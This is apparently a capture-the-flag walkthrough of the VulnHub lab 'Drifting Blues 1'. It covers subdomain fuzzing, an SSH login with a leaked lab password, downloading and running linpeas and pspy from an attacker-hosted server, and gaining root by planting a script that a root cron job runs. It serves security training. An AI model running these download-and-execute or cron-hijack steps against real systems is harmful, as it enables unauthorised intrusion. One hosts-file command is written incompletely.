---
title: "Drifting Blues 1"
date: 2021-05-15
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Drifting Blues 1 on VulnHub"
os: "Linux"
platform: "VulnHub"
tags: [DNS enumeration, website enumeration, crontab]
comments: false
---

Drifting Blues is the first in a series of 9 boxes on [Vulnhub](https://www.vulnhub.com/series/driftingblues,424/).

First, let's find the IP address of the host by utilizing:

**`netdiscover -i eth0`** 

from our Kali host. After a few moments, you should be able to uncover the IP of our target system.

![Drifting Blues 1 netdiscover](/images/driftingblues-1-1.png)

Once you have discovered the IP, let's enumerate this host to determine what ports/services are open/running. To do this, let's run:

**`threader3000`**

and enter the IP uncovered by netdiscover when prompted:



![Drifting Blues 1 threader3000](/images/driftingblues-1-2.png)

Once it has completed, let it run it's recommended nmap scan:

![Drifting Blues 1 nmap](/images/driftingblues-1-3.png)

It appears that we have SSH and an web server running on this box. Let's first take a look at the web server and open it up in a browser:

![Drifting Blues 1 website](/images/driftingblues-1-4.png)

Next, I ran:

**`python3 dirsearch.py -u http://<target ip>`**

to attempt to find hidden directories/files, but nothing showed up:

![Drifting Blues 1 dirsearch](/images/driftingblues-1-5.png)

Next, I looked at the source code on the main page of the website:

![Drifting Blues 1 source code](/images/driftingblues-1-6.png)

It appears that this comment is base64 encoded, let's decode it to see what it reveals (I utilized [CyberChef](http://gchq.github.io/CyberChef/) for this:

![Drifting Blues 1 base64 decode](/images/driftingblues-1-7.png)

Next, I navigated to the file on the website decoded above and was presented with the following:

![Drifting Blues 1 Ook](/images/driftingblues-1-8.png)

It appears to be some sort of encoding. I did a bit of research and came across the following [site](https://www.splitbrain.org/_static/ook/) to decode this:

![Drifting Blues 1 Ook Decoder](/images/driftingblues-1-9.png)

I then copied/pasted the text from the text file and decoded it, where I saw the following message:

![Drifting Blues 1 Ook decoded message](/images/driftingblues-1-10.png)

This mentions a secret location that needs to be added to a host file. Let's search around and see if we can find the domain name on the website somewhere:

![Drifting Blues 1 website review](/images/driftingblues-1-11.png)

After looking at the pages on the website, there's a email listed with a domain name of **driftingblues.box**. Let's add that to our host file on our attacker box with:

**`sudo /etc/hosts`**

![Drifting Blues 1 hosts file](/images/driftingblues-1-12.png)

Next, let's navigate to http://driftingblues.box in our browser to confirm it works as expected:

![Drifting Blues 1 website](/images/driftingblues-1-13.png)

It does, let's attempt to enumerate subdomains with wfuzz. The command to use is as follows:

**`wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://driftingblues.box"  -H "Host: FUZZ.driftingblues.box" -t 50`**

This will attempt to fuzz subdomains using the supplied list. We receive several results as shown below:

![Drifting Blues 1 wfuzz 1](/images/driftingblues-1-14.png)

It appears that most of these redirect to the main site (which is 570 words, 7710 characters). Let's exclude these by using the --hw flag which acts as a filter to filter out the number of words supplied (in this case, 570)

**`wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://driftingblues.box"  -H "Host: FUZZ.driftingblues.box" -t 50 -hw 570`**

This leaves us with one subdomain: **test**

![Drifting Blues 1 wfuzz 2](/images/driftingblues-1-15.png)

Let's add **test.driftingblues.box** to our hosts file by running:

**`nano /etc/hosts`**

![Drifting Blues 1 /etc/hosts test subdomain](/images/driftingblues-1-16.png)

Next, let's navigate to **http://test.driftingblues.box**

![Drifting Blues 1 test site](/images/driftingblues-1-17.png)

It appears this is a test site that is currently being built. Let's run:

**`python3 dirsearch.py -u http://test.driftingblues.box`**

![Drifting Blues 1 dirsearch test subdomain](/images/driftingblues-1-18.png)

We will see that there is a robots.txt file listed for this subdomain. Let's visit it in our browser:

![Drifting Blues 1 robots.txt](/images/driftingblues-1-19.png)

Let's look at the **/ssh_cred.txt** file:

![Drifting Blues 1 ssh_cred.txt](/images/driftingblues-1-20.png)

The username was a guess on my part, as we knew we had sheryl, eric, and db as users based on the notes uncovered so far. The user ended up being eric, and after a few attempts, we were able to get logged in with **1mw4ckyyucky6** as the password:

![driftingblues-1-21](/images/driftingblues-1-21.png)

From here, we can run:

**`cat user.txt`** 

to uncover the user flag.

![Drifting Blues 1 user.txt](/images/driftingblues-1-22.png)

Next, let's do some enumeration and see what we can do to escalate our privileges to root. On our attacker host, let's server up an http server in python with:

**`python3 -m http.server`**

![Drifting Blues 1 python http server](/images/driftingblues-1-23.png)

On our victim box, let's navigate to the tmp directory with:

**`cd tmp`**

followed by:

**`wget http://<attacker ip>:8000/linpeas.sh`** 

This will download the linpeas.sh script that is well known for it's enumeration capabilities.

Once downloaded, let's run:

**`chmod +x linpeas.sh`**

so the script can be executed.

![Drifting Blues 1 wget](/images/driftingblues-1-24.png)

Next, let's run the script with:

**`./linpeas.sh`**

![Drifting Blues 1 linpeas.sh](/images/driftingblues-1-25.png)

It appears that the path may be abused, but before I went down that route, I decided to download pspy64 to have it enumerate processes that are running. To download this and make it executable, I ran:

**`wget http://<attacker ip>:8000/pspy64`**

on the victim host followed by:

**`chmod +x pspy64`**

to make it executable.

![Drifting Blues 1 wget2](/images/driftingblues-1-26.png)

Next, I ran pspy64 with:

**`./pspy64`**

![Drifting Blues 1 pspy](/images/driftingblues-1-27.png)

After a few moments, it showed me that **/tmp/emergency** was being ran with sudo privileges every minute. I navigated to the /tmp directory with:

**`cd /tmp`** 

and the emergency file was not present. I then ran:

**`nano emergency`**

and added in

**`sudo usermod -aG sudo eric`**

to add eric to the list of sudo users:

![Drifting Blues 1 emergency file](/images/driftingblues-1-28.png)

Next, after saving this file, I made it executable with:

**`chmod +x emergency`**

![Drifting Blues 1 chmod emergency](/images/driftingblues-1-29.png)

Next, I waited a couple of minutes (as this script runs every minute), and then used:

**`sudo su`**

to escalate my privileges to root. I then ran the following commands:

**`**cd /root`****

**`ls`**

**`cat root.txt`**

![Drifting Blues 1 root](/images/driftingblues-1-30.png)

That's it! After finding the root flag we've completed this box.
